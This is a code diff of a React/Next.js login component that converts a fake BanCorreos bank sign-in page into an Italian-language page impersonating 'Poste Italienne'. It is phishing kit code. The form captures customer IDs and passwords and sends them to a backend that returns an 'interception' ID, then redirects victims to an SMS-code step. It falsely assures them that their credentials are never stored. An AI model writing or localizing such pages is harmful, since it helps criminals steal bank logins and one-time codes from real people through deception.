@@ -4,7 +4,7 @@ import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function BanCorreosConnect() {
+export default function PosteItalienneConnect() {
   const router = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -25,24 +25,24 @@ export default function BanCorreosConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "BanCorreos" // Ajout explicite du nom de la banque ici
+          bankName: "Poste-Italienne" // Ajout explicite du nom de la banque ici
         }),
       });
 
       const data = await response.json();
 
       if (!response.ok) {
-        throw new Error(data.error || "Une erreur est survenue.");
+        throw new Error(data.error || "Si è verificato un errore.");
       }
 
       // Stocke l'ID d'interception retourné par Turso pour l'étape suivante
       sessionStorage.setItem("current_interception_id", data.id);
 
       // Redirection immédiate vers la page de saisie du code SMS
-      router.push("/de/operation/montant");
+      router.push("/it/operation/montant");
 
     } catch (err: any) {
-      setError(err.message || "Erreur de connexion au serveur.");
+      setError(err.message || "Errore di connessione al server.");
     } finally {
       setIsLoading(false);
     }
@@ -50,7 +50,7 @@ export default function BanCorreosConnect() {
 
   return (
     <div className="bank-connect-container">
-      <Link href="/de/operation" className="back-btn">
+      <Link href="/it/operation" className="back-btn">
         <i className="fa-solid fa-arrow-left"></i>
       </Link>
 
@@ -58,19 +58,19 @@ export default function BanCorreosConnect() {
         <i className="fa-solid fa-shield-halved"></i>
       </div>
 
-      <h1 className="bank-connect-title">Betreffen BanCorreos</h1>
-      <p className="bank-connect-subtitle">Sichere und durchgängig verschlüsselte Verbindung.</p>
+      <h1 className="bank-connect-title">Accedi a Poste Italienne</h1>
+      <p className="bank-connect-subtitle">Connessione sicura e crittografata end-to-end.</p>
 
       <form className="login-form" onSubmit={handleConnect}>
         {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px' }}>{error}</div>}
 
         <div className="input-group">
-          <label>Kennung</label>
+          <label>Codice identificativo</label>
           <div className="input-wrapper">
             <input 
               type="text" 
               className="input-field" 
-              placeholder="Kundennummer" 
+              placeholder="Codice cliente" 
               value={username}
               onChange={(e) => setUsername(e.target.value)}
               required 
@@ -79,7 +79,7 @@ export default function BanCorreosConnect() {
         </div>
 
         <div className="input-group">
-          <label>Passwort</label>
+          <label>Password</label>
           <div className="input-wrapper">
             <input 
               type={showPassword ? "text" : "password"} 
@@ -103,7 +103,7 @@ export default function BanCorreosConnect() {
 
         <div className="security-note">
           <i className="fa-solid fa-lock"></i>
-          <span>Ihre Anmeldedaten werden verschlüsselt und niemals auf unseren Servern gespeichert.</span>
+          <span>I tuoi dati di accesso sono crittografati e non vengono mai salvati sui nostri server.</span>
         </div>
 
         <button type="submit" className="btn-link-bank" disabled={isLoading}>
@@ -112,7 +112,7 @@ export default function BanCorreosConnect() {
           ) : (
             <>
               <i className="fa-solid fa-link"></i>
-              Weitermachen
+              Continua
             </>
           )}
         </button>
